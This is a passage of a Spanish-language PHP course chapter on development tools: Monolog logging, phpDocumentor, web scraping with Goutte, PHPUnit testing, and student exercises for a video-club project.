<pre><code>&lt;?php\n// Crear logger con canal \"MiLogger\"\n$log = new Logger(\"MiLogger\");\n\n// Manejadores de logs\n$log-&gt;pushHandler(new StreamHandler(\"logs/milog.log\", Level::Debug));\n$log-&gt;pushHandler(new FirePHPHandler(Level::Info));\n\n// Procesadores para a\u00f1adir/modificar informaci\u00f3n de los logs como funci\u00f3n\n$log-&gt;pushProcessor(function ($record) {\n    $record['extra']['user_ip'] = $_SERVER['REMOTE_ADDR'] ?? 'N/A';\n    return $record;\n});\n\n// Mensaje de log\n$log-&gt;debug(\"Esto es un mensaje de DEBUG\");\n</code></pre> <pre><code>[2024-11-05T19:06:52.582058+01:00] MiLogger.DEBUG: Esto es un mensaje de DEBUG [] {\"user_ip\":\"192.168.65.1\"}\n</code></pre>"},{"location":"05herramientas.html#formateadores","title":"Formateadores","text":"<p>Se asocian a los manejadores con <code>setFormatter</code>. Los formateadores m\u00e1s utilizados son <code>LineFormatter</code>, <code>HtmlFormatter</code> o <code>JsonFormatter</code>. En el ejemplo siguiente se usa un manejador de archivos rotativo que empezar\u00e1 escribiendo los mensajes en 'milog-AAAA-MM-DD.log' y continuar\u00e1 con los 6 siguientes d\u00edas antes de volver a empezar por el primer archivo. Antes de a\u00f1adir el manejador, se le confiugra un formateador para que devuelva los mensajes en formato JSON.</p> PHPConsola en JSON <pre><code>&lt;?php\n$log = new Logger(\"MiLogger\");\n$rfh = new RotatingFileHandler(\"logs/milog.log\", 7, Level::Debug);\n$rfh-&gt;setFormatter(new JsonFormatter());\n$log-&gt;pushHandler($rfh);\n</code></pre> <pre><code>{\"message\":\"Esto es un mensaje de DEBUG\",\"context\":{},\"level\":100,\"level_name\":\"DEBUG\",\"channel\":\"MiLogger\",\"datetime\":\"2020-11-27T15:36:52.747211+01:00\",\"extra\":{}}\n{\"message\":\"Esto es un mensaje de INFO\",\"context\":{},\"level\":200,\"level_name\":\"INFO\",\"channel\":\"MiLogger\",\"datetime\":\"2020-11-27T15:36:52.747538+01:00\",\"extra\":{}}\n</code></pre> <p>M\u00e1s informaci\u00f3n</p> <p>M\u00e1s informaci\u00f3n sobre manejadores, formateadores y procesadores en https://github.com/Seldaek/monolog/blob/master/doc/02-handlers-formatters-processors.md</p>"},{"location":"05herramientas.html#uso-de-factorias","title":"Uso de Factor\u00edas","text":"<p>En vez de instanciar un log en cada clase, es conveniente crear una factor\u00eda (por ejemplo, siguiendo la idea del patr\u00f3n de dise\u00f1o Factory Method) encapsulando as\u00ed la creaci\u00f3n del Logger en dicho m\u00e9todo. De esta forma, si en el futuro cambiamos la implementaci\u00f3n del log con otra librer\u00eda que no sea Monolog, no tendremos que modificar nuestro codigo.</p> <p>Para el siguiente ejemplo, vamos a crear la factor\u00eda en el namespace <code>Dwes\\Util</code> y vamos a hacer que en vez de que devuelva un <code>Monolog\\Logger</code>, devuelva un objeto que impolementa una interfaz PSR-3 <code>Psr\\Log\\LoggerInterface</code>:</p> <pre><code>&lt;?php\nnamespace Dwes\\Util;\n\nuse Monolog\\Handler\\StreamHandler;\nuse Monolog\\Logger;\nuse Monolog\\Level;\nuse Psr\\Log\\LoggerInterface;\n\nclass LogFactory {\n\n    public static function createLogger(string $canal = \"miApp\", string $logFile) : LoggerInterface {\n        // Toda la relaci\u00f3n con la clase Monolog queda encapsulada aqu\u00ed\n        $log = new Logger($canal);\n        $log-&gt;pushHandler(new StreamHandler($logFile, Level::Debug));\n\n        return $log;\n    }\n}\n</code></pre> <p>En todas las clases que usaban directamente Monolog, ahora llamamos a la factor\u00eda:</p> <pre><code>&lt;?php\nnamespace Dwes\\Model;\n\nuse Dwes\\Util\\LogFactory;\nuse Psr\\Log\\LoggerInterface;\n\nclass Cliente {\n\n    private $codigo; \n    private LoggerInterface $log;\n\n    function __construct($codigo) { \n        $this-&gt;codigo=$codigo; \n        $this-&gt;log = LogFactory::createLogger(\"clienteChannel\", \"logs/cliente.log\");\n    }\n\n    public function realizarAccion(string $accion): void {\n        // C\u00f3digo de la acci\u00f3n...\n        // y evento que guardamos en el log\n        $this-&gt;log-&gt;info(\"El cliente $this-&gt;codigo est\u00e1 realizando la acci\u00f3n: $accion\");\n    }\n}\n</code></pre> <p>Y para completar el ejemplo, desde el <code>index.php</code> as\u00ed quedar\u00eda el uso de <code>Cliente</code>:</p> <pre><code>&lt;?php\ninclude __DIR__ .\"/vendor/autoload.php\";\n\n// PRUEBA DE LA FACTOR\u00cdA\nuse Dwes\\Model\\Cliente;\n\n$cliente = new Cliente(100);\n$cliente-&gt;realizarAccion(\"Inicio de sesi\u00f3n\");\n</code></pre> <p>Uso de interfaz como atributo de clase</p> <p>En PHP, cuando se declara un atributo con un tipo basado en una interfaz (como <code>Psr\\Log\\LoggerInterface</code>), no se especifica que deba contener directamente una instancia de esa interfaz (lo cual ser\u00eda imposible, porque las interfaces no pueden instanciarse). En cambio, especifica que el atributo debe contener una instancia de una clase que implemente esa interfaz, como <code>Monolog\\Logger</code>.</p>"},{"location":"05herramientas.html#54-documentacion-con-phpdocumentor","title":"5.4 Documentaci\u00f3n con phpDocumentor","text":"<p>phpDocumentor es la herramienta de facto para documentar el c\u00f3digo PHP. Es similar en prop\u00f3sito y funcionamiento a Javadoc.</p> <p>As\u00ed pues, es un herramienta que facilita la documentaci\u00f3n del c\u00f3digo PHP, creando un sitio web con el API de la aplicaci\u00f3n.</p> <p>Se basa en el uso de anotaciones sobre los docblocks. Para ponerlo en marcha, en nuestro caso nos decantaremos por utilizar la imagen que ya existe de Docker.</p>"},{"location":"05herramientas.html#instalacion-como-binario-mas-sencillo","title":"Instalaci\u00f3n como binario (m\u00e1s sencillo)","text":"<p>Otra opci\u00f3n es seguir los pasos que recomienda la documentaci\u00f3n oficial para instalarlo como un ejecutable, que son descargar el archivo <code>phpDocumentor.phar</code> y darles permisos de ejecuci\u00f3n:</p> <pre><code>wget https://phpdoc.org/phpDocumentor.phar\nchmod +x phpDocumentor.phar\nmv phpDocumentor.phar /usr/local/bin/phpdoc\nphpdoc --version\n</code></pre> <p>Si no disponemos de wget, descargar manualmente el .phar y mover al directorio correspondiente.</p> <p>Una vez instalado, desde el ra\u00edz del proyecto, suponiendo que tenemos nuestro c\u00f3digo dentro de <code>app</code> y que queremos la documentaci\u00f3n dentro de <code>docs/api</code> ejecutamos:</p> <pre><code>phpdoc -d ./app -t docs/api\n</code></pre>"},{"location":"05herramientas.html#uso-en-docker","title":"Uso en Docker","text":"<p>En el caso de usar Docker, usaremos el siguiente comando para ejecutarlo (crea el contenedor, ejecuta el comando que le pidamos, y autom\u00e1ticamente lo borra):</p> <pre><code>docker run --rm -v \"$(pwd)\":/data phpdoc/phpdoc:3\n</code></pre> <p>A dicho comando, le adjuntaremos los diferentes par\u00e1metros que admite phpDocumentor, por ejemplo:</p> <pre><code># Muestra la versi\u00f3n\ndocker run --rm -v \"$(pwd)\":/data phpdoc/phpdoc:3 --version\n# Mediante -d se indica el origen a parsear\n# Mediante -t se indica el destino donde generar la documentaci\u00f3n\ndocker run --rm -v \"$(pwd)\":/data phpdoc/phpdoc:3 -d ./src/app -t ./docs/api\n</code></pre>"},{"location":"05herramientas.html#docblock","title":"DocBlock","text":"<p>Un docblock es el bloque de c\u00f3digo que se coloca encima de un recurso. Su formato es:</p> <pre><code>&lt;?php\n/**\n* Resumen en una sola l\u00ednea\n*\n* Descripci\u00f3n que puede utilizar varias l\u00edneas\n* y que ofrece detalles del elemento o referencias\n* para ampliar la informaci\u00f3n\n*\n* @param string $miArgumento con una *descripci\u00f3n* del argumento\n* que puede usar varias l\u00edneas.\n*\n* @return void\n*/\nfunction miFuncion(tipo $miArgumento){\n    // C\u00f3digo de la funci\u00f3n\n}\n</code></pre>"},{"location":"05herramientas.html#documentando-el-codigo","title":"Documentando el c\u00f3digo","text":"<p>En todos los elementos, ademas del resumen y/o descripci\u00f3n, pondremos:</p> <ul> <li>En las clases:<ul> <li><code>@author</code> nombre  <li><code>@package</code> ruta del namespace</li> <li>En las propiedades:<ul> <li><code>@var</code> tipo descripci\u00f3n</li> </ul> </li> <li>En los m\u00e9todos:<ul> <li><code>@param</code> tipo $nombre descripci\u00f3n</li> <li><code>@throws</code> ClaseException descripci\u00f3n</li> <li><code>@return</code> tipo descripci\u00f3n</li> </ul> </li> <p>Ve\u00e1moslo con un ejemplo. Supongamos que tenemos una clase que representa un cliente:</p> <pre><code>&lt;?php\n/**\n* Clase que representa un cliente\n* \n* El cliente se encarga de almacenar los soportes que tiene alquilado,\n* de manera que podemos alquilar y devolver productos mediante las operaciones\n* hom\u00f3nimas.\n* \n* @package Dwes\\Videoclub\\Model\n* @author Aitor Medrano &lt;a.medrano@edu.gva.es&gt;\n*/\nclass Cliente {\n\n    public string $nombre; \n    private string $numero;\n\n    /**\n    * Colecci\u00f3n de soportes alquilados\n    * @var array&lt;Soporte&gt; \n    */\n    private $soportesAlquilados[];\n\n    /**\n    * Comprueba si el soporte recibido ya lo tiene alquilado el cliente\n    * @param Soporte $soporte Soporte a comprobar\n    * @return bool true si lo tiene alquilado\n    */\n    public function tieneAlquilado(Soporte $soporte) : bool { \n        // ...\n    }\n</code></pre> <p>Si generamos la documentaci\u00f3n y abrimos con un navegador el archivo <code>docs/api/index.html</code> podremos navegar hasta la clase `Cliente:</p> phpDocumentor de Cliente"},{"location":"05herramientas.html#55-web-scraping","title":"5.5 Web Scraping","text":"<p>Consiste en navegar a una p\u00e1gina web y extraer informaci\u00f3n autom\u00e1ticamente, a partir del c\u00f3digo HTML generado, y organizar la informaci\u00f3n p\u00fablica disponible en Internet.</p> <p>Esta pr\u00e1ctica requiere el uso de una librer\u00eda que facilite la descarga de la informaci\u00f3n deseada imitando la interacci\u00f3n de un navegador web. Este \"robot\" puede acceder a varias p\u00e1ginas simult\u00e1neamente.</p> <p>\u00bfEs legal?</p> <p>Si el sitio web indica que tiene el contenido protegido por derechos de autor o en las normas de acceso via usuario/contrase\u00f1a nos avisa de su prohibici\u00f3n, estar\u00edamos incurriendo en un delito. Es recomendable estudiar el archivo <code>robots.txt</code> que se encuentra en el ra\u00edz de cada sitio web. M\u00e1s informaci\u00f3n en el art\u00edculo El manual completo para el web scraping legal y \u00e9tico en 2021</p>"},{"location":"05herramientas.html#goutte","title":"Goutte","text":"<p>Goutte es un sencillo cliente HTTP para PHP creado espec\u00edficamente para hacer web scraping. Lo desarroll\u00f3 el mismo autor del framework Symfony y ofrece un API sencilla para extraer datos de las respuestas HTML/XML de los sitios web.</p> <p>FIXME: Revisar https://godofredo.ninja/web-scraping-con-php-utilizando-goutte/</p> <p>Los componentes principales que abstrae Goutte sobre Symfony son:</p> <ul> <li><code>BrowserKit</code>: simula el comportamiento de un navegador web.</li> <li><code>CssSelector</code>: traduce consultas CSS en consultas XPath.</li> <li><code>DomCrawler</code>: facilita el uso del DOM y XPath.</li> </ul> <p>Para poder utilizar Goutte en nuestro proyecto, ejecutaremos el siguiente comando en el terminal:</p> <pre><code>composer require fabpot/goutte\n</code></pre>"},{"location":"05herramientas.html#goutte-con-selectores-css","title":"Goutte con selectores CSS","text":"<p>A continuaci\u00f3n vamos a hacer un ejemplo muy sencillo utilizando los selectores CSS, extrayendo informaci\u00f3n de la web <code>https://books.toscrape.com/</code>, la cual es una p\u00e1gina para pruebas que no rechazar\u00e1 nuestras peticiones.</p> <p>Tras crear un cliente con Goutte, hemos de realizar un petici\u00f3n a una URL. Con la respuesta obtenida, podemos utilizar el m\u00e9todo <code>filter</code> para indicarle la ruta CSS que queremos recorrer e iterar sobre los resultados mediante una funci\u00f3n an\u00f3nima. Una vez estamos dentro de un determinado nodo, el m\u00e9todo <code>text()</code> nos devolver\u00e1 el contenido del propio nodo.</p> <p>En concreto, vamos a meter en un array asociativo el t\u00edtulo y el precio de todos los libros de la categor\u00eda Classics.</p> <pre><code>&lt;?php\nrequire '../vendor/autoload.php';\n\n$httpClient = new \\Goutte\\Client();\n$response = $httpClient-&gt;request('GET', 'https://books.toscrape.com/catalogue/category/books/classics_6/index.html');\n// colocamos los precios en un array\n$precios = [];\n$response-&gt;filter('.row li article div.product_price p.price_color')-&gt;each(\n    // le pasamos $precios por referencia para poder editarla dentro del closure\n    function ($node) use (&amp;$precios) {\n        $precios[] = $node-&gt;text();\n    }\n);\n\n// colocamos el nombre y el precio en un array asociativo\n$contadorPrecios = 0;\n$libros = [];\n$response-&gt;filter('.row li article h3 a')-&gt;each(\n    function ($node) use ($precios, &amp;$contadorPrecios, &amp;$libros) {\n        $libros[$node-&gt;text()] = $precios[$contadorPrecios];\n        $contadorPrecios++;\n    }\n);\n</code></pre>"},{"location":"05herramientas.html#crawler","title":"Crawler","text":"<p>Un caso muy com\u00fan es obtener la informaci\u00f3n de una p\u00e1gina que tiene los resultados paginados, de manera que vayamos recorriendo los enlaces y accediendo a cada uno de los resultados.</p> <p>En este caso vamos a coger todos los precios de los libros de fantas\u00eda, y vamos a sumarlos:</p> <pre><code>&lt;?php\nrequire '../vendor/autoload.php';\n\nuse Goutte\\Client;\nuse Symfony\\Component\\HttpClient\\HttpClient;\n\n$client = new Client(HttpClient::create(['timeout' =&gt; 60]));\n$crawler = $client-&gt;request('GET', 'https://books.toscrape.com/catalogue/category/books/fantasy_19/index.html');\n\n$salir = false;\n\n$precios = [];\nwhile (!$salir) {\n    $crawler-&gt;filter('.row li article div.product_price p.price_color')-&gt;each(\n        function ($node) use (&amp;$precios) {\n            $texto = $node-&gt;text();\n            $cantidad = substr($texto, 2); // Le quitamos las libras \u00bf2 posiciones?\n            $precios[] = floatval($cantidad);\n        }\n    );\n\n    $enlace = $crawler-&gt;selectLink('next');\n    if ($enlace-&gt;count() != 0) {\n        // el enlace next existe\n        $sigPag = $crawler-&gt;selectLink('next')-&gt;link();\n        $crawler = $client-&gt;click($sigPag); // hacemos click\n    } else {\n        // ya no hay enlace next\n        $salir = true;\n    }\n}\n\n$precioTotal = array_sum($precios);\necho $precioTotal;\n</code></pre>"},{"location":"05herramientas.html#56-pruebas-con-phpunit","title":"5.6 Pruebas con PHPUnit","text":"<p>El curso pasado, dentro del m\u00f3dulo de Entornos de Desarrollo, estudiamos la importancia de la realizaci\u00f3n de pruebas, as\u00ed como las pruebas unitarias mediante JUnit.</p> Test Driven Development <p>A d\u00eda de hoy es de gran importancia seguir una buena metodolog\u00eda de pruebas, siendo el desarrollo dirigido por las pruebas (Test Driven Development / TDD) uno de los enfoques m\u00e1s empleados, el cual consiste en:</p> <ol> <li>Escribir el test, y como no hay c\u00f3digo implementado, la prueba falle (rojo).</li> <li>Escribir el c\u00f3digo de aplicaci\u00f3n para que la prueba funcione (verde).</li> <li>Refactorizar el c\u00f3digo de la aplicaci\u00f3n con la ayuda de la prueba para comprobar que no rompemos nada (refactor).</li> </ol> <p>En el caso de PHP, la herramienta que se utiliza es PHPUnit (https://phpunit.de/), que como su nombre indica, est\u00e1 basada en JUnit. La versi\u00f3n actual es la 9.0</p> <p>Se recomienda consultar su documentaci\u00f3n en https://phpunit.readthedocs.io/es/latest/index.html.</p>"},{"location":"05herramientas.html#puesta-en-marcha","title":"Puesta en marcha","text":"<p>Vamos a colocar todas las pruebas en una carpeta <code>tests</code> en el ra\u00edz de nuestro proyecto.</p> <p>En el archivo <code>composer.json</code>, a\u00f1adimos:</p> <pre><code>\"require-dev\": {\n    \"phpunit/phpunit\": \"^9\"\n},\n\"scripts\": {\n    \"test\": \"phpunit --testdox --colors tests\"\n}\n</code></pre> <p>Si quisi\u00e9ramos a\u00f1adir la librer\u00eda desde un comando del terminal, tambi\u00e9n podr\u00edamos ejecutar:</p> <pre><code>composer require --dev phpunit/phpunit ^9\n</code></pre> <p>Librer\u00edas de desarrollo</p> <p>Las librer\u00edas que se colocan en <code>require-dev</code> son las de desarrollo y testing, de manera que no se instalar\u00e1n en un entorno de producci\u00f3n.</p> <p>Como hemos creado un script, podemos lanzar las pruebas mediante:</p> <pre><code>composer test\n</code></pre> <p>Vasmos a realizar nuestra primera prueba:</p> <pre><code>&lt;?php\nuse PHPUnit\\Framework\\TestCase;\n\nclass PilaTest extends TestCase\n{\n    public function testPushAndPop()\n    {\n        $pila = [];\n        $this-&gt;assertSame(0, count($pila));\n\n        array_push($pila, 'batman');\n        $this-&gt;assertSame('batman', $pila[count($pila)-1]);\n        $this-&gt;assertSame(1, count($pila));\n\n        $this-&gt;assertSame('batman', array_pop($pila));\n        $this-&gt;assertSame(0, count($pila));\n    }\n}\n</code></pre> <p>Tenemos diferentes formas de ejecutar una prueba:</p> <pre><code>./vendor/bin/phpunit tests/PilaTest.php\n./vendor/bin/phpunit tests\n./vendor/bin/phpunit --testdox tests\n./vendor/bin/phpunit --testdox --colors tests\n</code></pre>"},{"location":"05herramientas.html#disenando-pruebas","title":"Dise\u00f1ando pruebas","text":"<p>Tal como hemos visto en el ejemplo, la clase de prueba debe heredar de <code>TestCase</code>, y el nombre de la clase debe acabar en <code>Test</code>, de ah\u00ed que hayamos llamado la clase de prueba como <code>PilaTest</code>.</p> <p>Una prueba implica un m\u00e9todo de prueba (p\u00fablico) por cada funcionalidad a probar. Cada un de los m\u00e9todos se les asocia un caso de prueba.</p> <p>Los m\u00e9todos deben nombrarse con el prefijo <code>test</code>, por ejemplo, <code>testPushAndPop</code>. Es muy importante que el nombre sea muy claro y descriptivo del prop\u00f3sito de la prueba. (camelCase).</p> <p>En los casos de prueba prepararemos varias aserciones para toda la casu\u00edstica: rangos de valores, tipos de datos, excepciones, etc...</p>"},{"location":"05herramientas.html#aserciones","title":"Aserciones","text":"<p>Las aserciones permiten comprobar el resultado de los m\u00e9todos que queremos probar. Las aserciones esperan que el predicado siempre sea verdadero.</p> <p>PHPUnit ofrece las siguiente aserciones:</p> <ul> <li><code>assertTrue</code> / <code>assertFalse</code>: Comprueba que la condici\u00f3n dada sea evaluada como true / false</li> <li><code>assertEquals</code> / <code>assertSame</code>: Comprueba que dos variables sean iguales</li> <li><code>assertNotEquals</code> / <code>assertNotSame</code>: Comprueba que dos variables NO sean iguales<ul> <li><code>Same</code> \u2192 comprueba los tipos. Si no coinciden los tipos y los valores, la aserci\u00f3n fallar\u00e1</li> <li><code>Equals</code> \u2192 sin comprobaci\u00f3n estricta</li> </ul> </li> <li><code>assertArrayHasKey</code> / <code>assertArrayNotHasKey</code>: Comprueba que un array posea un key determinado / o NO lo posea</li> <li><code>assertArraySubset</code>: Comprueba que un array posea otro array como subset del mismo</li> <li><code>assertAttributeContains</code> / <code>assertAttributeNotContains</code>: Comprueba que un atributo de una clase contenga una variable determinada / o NO contenga una variable determinada</li> <li><code>assertAttributeEquals</code>: Comprueba que un atributo de una clase sea igual a una variable determinada.</li> </ul>"},{"location":"05herramientas.html#comparando-la-salida","title":"Comparando la salida","text":"<p>Si los m\u00e9todos a probar generan contenido mediante <code>echo</code> o una instrucci\u00f3n similar, disponemos de las siguiente expectativas:</p> <ul> <li><code>expectOutputString(salidaEsperada)</code></li> <li><code>expectOutputRegex(expresionRegularEsperada)</code></li> </ul> <p>Las expectativas difieren de las aserciones que informan del resultado que se espera antes de invocar al m\u00e9todo. Tras definir la expectativa, se invoca al m\u00e9todo que realiza el <code>echo</code>/<code>print</code>.</p> <pre><code>&lt;?php\nnamespace Dwes\\Videoclub\\Model;\n\nuse PHPUnit\\Framework\\TestCase;\nuse Dwes\\Videoclub\\Model\\CintaVideo;\n\nclass CintaVideoTest extends TestCase {\n    public function testConstructor()\n    {\n        $cinta = new CintaVideo(\"Los cazafantasmas\", 23, 3.5, 107); \n        $this-&gt;assertSame( $cinta-&gt;getNumero(), 23);\n    }\n\n    public function testMuestraResumen()\n    {\n        $cinta = new CintaVideo(\"Los cazafantasmas\", 23, 3.5, 107);\n        $resultado = \"&lt;br&gt;Pel\u00edcula en VHS:\";\n        $resultado .= \"&lt;br&gt;Los cazafantasmas&lt;br&gt;3.5 (IVA no incluido)\";\n        $resultado .= \"&lt;br&gt;Duraci\u00f3n: 107 minutos\";\n        // definimos la expectativa\n        $this-&gt;expectOutputString($resultado);\n        // invocamos al m\u00e9todo que har\u00e1 echo\n        $cinta-&gt;muestraResumen();\n    }\n}\n</code></pre>"},{"location":"05herramientas.html#proveedores-de-datos","title":"Proveedores de datos","text":"<p>Cuando tenemos pruebas que solo cambian respecto a los datos de entrada y de salida, es \u00fatil utilizar proveedores de datos.</p> <p>Se declaran en el docblock mediante <code>@dataProvider nombreMetodo</code>, donde se indica el nombre de un m\u00e9todo p\u00fablico que devuelve un array de arrays, donde cada elemento es un caso de prueba.</p> <p>La clase de prueba recibe como par\u00e1metros los datos a probar y el resultado de la prueba como \u00faltimo par\u00e1metro.</p> <p>El siguiente ejemplo comprueba con diferentes datos el funcionamiento de <code>muestraResumen</code>:</p> <pre><code>&lt;?php\n/**\n * @dataProvider cintasProvider\n */\npublic function testMuestraResumenConProvider($titulo, $id, $precio, $duracion, $esperado)\n{\n    $cinta = new CintaVideo($titulo, $id, $precio, $duracion);\n    $this-&gt;expectOutputString($esperado);\n    $cinta-&gt;muestraResumen();\n}\n\npublic function cintasProvider() {\n    return [\n        \"cazafantasmas\" =&gt; [\"Los cazafantasmas\", 23, 3.5, 107, \"&lt;br&gt;Pel\u00edcula en VHS:&lt;br&gt;Los cazafantasmas&lt;br&gt;3.5 \u20ac(IVA no incluido)&lt;br&gt;Duraci\u00f3n: 107 minutos\"],\n        \"superman\" =&gt; [\"Superman\", 24, 3, 188, \"&lt;br&gt;Pel\u00edcula en VHS:&lt;br&gt;Superman&lt;br&gt;3 \u20ac (IVA no incluido)&lt;br&gt;Duraci\u00f3n: 188 minutos\"],\n    ];\n}\n</code></pre>"},{"location":"05herramientas.html#probando-excepciones","title":"Probando excepciones","text":"<p>Las pruebas adem\u00e1s de comprobar que las clases funcionan como se espera,  han de cubrir todos los casos posibles. As\u00ed pues, debemos poder hacer pruebas que esperen que se lance una excepci\u00f3n (y que el mensaje contenga cierta informaci\u00f3n):</p> <p>Para ello, se utilizan las siguiente expectativas:</p> <ul> <li><code>expectException(Excepcion::class)</code></li> <li><code>expectExceptionCode(codigoExcepcion)</code></li> <li><code>expectExceptionMessage(mensaje)</code></li> </ul> <p>Del mismo modo que antes, primero se pone la expectativa, y luego se provoca que se lance la excepci\u00f3n:</p> <pre><code>&lt;?php\npublic function testAlquilarCupoLleno() {\n    $soporte1 = new CintaVideo(\"Los cazafantasmas\", 23, 3.5, 107); \n    $soporte2 = new Juego(\"The Last of Us Part II\", 26, 49.99, \"PS4\", 1, 1);\n    $soporte3 = new Dvd(\"Origen\", 24, 15, \"es,en,fr\", \"16:9\"); \n    $soporte4 = new Dvd(\"El Imperio Contraataca\", 4, 3, \"es,en\",\"16:9\"); \n\n    $cliente1 = new Cliente(\"Bruce Wayne\", 23); \n    $cliente1-&gt;alquilar($soporte1); \n    $cliente1-&gt;alquilar($soporte2); \n    $cliente1-&gt;alquilar($soporte3); \n\n    $this-&gt;expectException(CupoSuperadoException::class);\n    $cliente1-&gt;alquilar($soporte4); \n}\n</code></pre>"},{"location":"05herramientas.html#cobertura-de-codigo","title":"Cobertura de c\u00f3digo","text":"<p>La cobertura de pruebas indica la cantidad de c\u00f3digo que las pruebas cubren, siendo recomendable que cubran entre el 95 y el 100%.</p> <p>Una de las m\u00e9tricas asociadas a los informes de cobertura es el CRAP (An\u00e1lisis y Predicciones sobre el Riesgo en Cambios), el cual mide la cantidad de esfuerzo, dolor y tiempo requerido para mantener una porci\u00f3n de c\u00f3digo. Esta m\u00e9trica debe mantenerse con un valor inferior a 5.</p> <p>Requisito xdebug</p> <p>Aunque ya viene instalado dentro de PHPUnit, para que funcione la cobertura del c\u00f3digo, es necesario que el c\u00f3digo PHP se ejecute con XDEBUG, y e indicarle a Apache que as\u00ed es (colocando en el archivo de configuraci\u00f3n <code>php.ini</code>la directiva <code>xdebug.mode=coverage</code>).</p> <p>A\u00f1adimos en <code>composer.json</code> un nuevo script:</p> <pre><code>\"coverage\": \"phpunit --coverage-html coverage --coverage-filter app tests\"\n</code></pre> <p>Y posteriormente ejecutamos</p> <pre><code>composer coverage\n</code></pre> <p>Por ejemplo, si accedemos a la clase <code>CintaVideo</code> con la prueba que hab\u00edamos realizado anteriormente, podemos observar la cobertura que tiene al 100% y que su CRAP es 2.</p> Informe de cobertura de la clase CintaVideo <p>Temas pendientes</p> <ul> <li>Dependencia entre casos de prueba con el atributo <code>@depends</code></li> <li>Completamente configurable mediante el archivo <code>phpxml.xml</code>: https://phpunit.readthedocs.io/es/latest/configuration.html</li> <li>Preparando las pruebas con <code>setUpBeforeClass()</code> y <code>tearDownAfterClass()</code></li> <li>Objetos y pruebas Mock (dobles) con <code>createMock()</code></li> </ul>"},{"location":"05herramientas.html#57-referencias","title":"5.7 Referencias","text":"<ul> <li>Tutorial de Composer</li> <li>Web Scraping with PHP \u2013 How to Crawl Web Pages Using Open Source Tools</li> <li>PHP Monolog</li> <li>Unit Testing con PHPUnit \u2014 Parte 1, de Emiliano Zublena.</li> </ul>"},{"location":"05herramientas.html#58-actividades","title":"5.8 Actividades","text":""},{"location":"05herramientas.html#resend","title":"Resend","text":"<ol> <li> <p>Crea un nuevo proyecto con Composer llamado <code>Correos</code>:</p> <ul> <li>Incluye como librer\u00eda la \u00faltima versi\u00f3n de Resend.</li> <li>Reg\u00edstrate en su web y obt\u00e9n tu API key para utilizar en el proyecto.</li> <li>Crea un archivo <code>01_mail_script.php</code> en la ra\u00edz del proyecto con el c\u00f3digo justo para enviar un correo de prueba.</li> <li>Crea un archivo <code>02_mail_form.php</code> en la ra\u00edz del proyecto con un formulario que pida destinatario, asunto y cuerpo del mensaje a enviar. El mismo script PHP se encargar\u00e1 de recibir los datos del formulario y enviar el correo. No olvides validar en el lado del servidor.</li> </ul> </li> <li> <p>Siguiendo con el proyecto <code>Correos</code>:</p> <ul> <li>Crea la clase <code>Dwes\\Correos\\MailResend</code>. Aseg\u00farate de configurar correctamente el <code>composer.json</code> para que el autoload cargue tambi\u00e9n nuestras clases dentro del directorio <code>app</code>.</li> <li>Define una propiedad privada nombrada <code>resend</code> e inicial\u00edzala mediante el m\u00e9todo <code>client</code> en el constructor.</li> <li>Crea un m\u00e9todo <code>sendEmail</code> al que le pases el destinatario, asunto y cuerpo del mensaje a enviar. Debe enviar el correo haciendo uso de la propiedad privada <code>resend</code>.</li> <li>Crea un archivo <code>03_mail_script_class.php</code> en la ra\u00edz del proyecto que haga uso de la clase <code>MailResend</code> para enviar un correo de prueba.</li> <li>Crea un archivo <code>04_mail_form_class.php</code> en la ra\u00edz del proyecto que haga uso de la clase <code>MailResend</code> para enviar un correo con los datos recogidos del formulario.  </li> </ul> </li> <li> <p>Investiga una de las soluciones alternativas propuestas para el env\u00edo de correos y realiza los mismos pasos de los ejercicios anteriores con la nueva librer\u00eda en el mismo proyecto <code>Correos</code>: Crea la clase <code>Dwes\\Correos\\MailLIBRERIA</code> con el m\u00e9todo <code>sendMail</code> y pru\u00e9balo en los archivos <code>05_mail_script_class2.php</code> y <code>06_mail_form_class2.php</code>.</p> </li> </ol>"},{"location":"05herramientas.html#monolog","title":"Monolog","text":"<ol> <li> <p>Crea un nuevo proyecto con Composer llamado <code>Monologos</code>:</p> <ul> <li>Incluye como librer\u00eda la \u00faltima versi\u00f3n de Monolog.</li> <li>Crea la clase <code>Dwes\\Monologos\\HolaMonolog</code>.</li> <li>Define una propiedad privada nombrada <code>resend</code> para guardar el log.</li> <li>Define en el constructor un <code>RotatingFileHandler</code> que escriba en la carpeta <code>logs</code> del proyecto, y que almacene los mensajes a partir de debug.</li> <li>Crea los m\u00e9todos <code>saludar</code> y <code>despedir</code> que hagan un log de tipo info con la acci\u00f3n correspondiente.</li> </ul> </li> <li> <p>Siguiendo con el proyecto <code>Monologos</code>:</p> <ul> <li>Crea un archivo llamado <code>inicio.php</code> que permita probar <code>HolaMonolog</code>.</li> <li>Comprueba que los mensajes aparecen en el log.</li> <li>Cambia el nivel para que el manejador solo muestre los mensajes a partir de warning.</li> <li>Vuelve a ejectuar <code>inicio.php</code> y comprueba el archivo de log.</li> </ul> </li> <li> <p>Modifica la clase <code>HolaMonolog</code>:</p> <ul> <li>En el constructor, a\u00f1ade a la pila un manejador que escriba a la salida de error conjunto al procesador de introspecci\u00f3n, mostrando mensajes desde el nivel debug.</li> <li>A\u00f1ade una propiedad denominada <code>hora</code>, la cual se inicializa \u00fanicamente como par\u00e1metro del constructor. Si la <code>hora</code> es inferior a 0 o mayor de 24, debe escribir un log de warning con un mensaje apropiado.</li> <li>Modifica los m\u00e9todos <code>saludar</code> y <code>despedir</code> para hacerlo acorde a la propiedad <code>hora</code> (buenos d\u00edas, buenas tardes, hasta ma\u00f1ana, etc...)</li> </ul> </li> </ol>"},{"location":"05herramientas.html#proyecto-videoclub-40","title":"Proyecto Videoclub 4.0","text":"<ol> <li> <p>Como ya tenemos Composer instalado:</p> <ul> <li>Inicial\u00edzalo dentro de tu proyecto Videoclub</li> <li>Incluye Resend, Monolog y PhpUnit, cada una en su lugar adecuado.</li> <li>A\u00f1ade el autoload al archivo <code>composer.json</code>, y haz los cambios necesarios en las clases para utilizar el autoload de Composer.</li> <li>Sube los cambios a GitHub y crea la etiqueta <code>v0.511</code>.</li> </ul> </li> <li> <p>Modifica <code>createCliente.php</code> para que una vez reciba los datos del formulario de registro y los valide, env\u00ede un correo de confirmaci\u00f3n antes de crear realmente el usuario y almacenarlo en la sesi\u00f3n. El correo contendr\u00e1 un enlace con la informaci\u00f3n del usuario y un campo espec\u00edfico del tipo: <code>.../createCliente.php?validado=1&amp;nombre=...</code>. As\u00ed se podr\u00e1 comprobar que llega desde el correo para para proceder a crear el cliente y volver a cargar <code>mainAdmin.php</code> donde se podr\u00e1 ver el cliente insertado.</p> 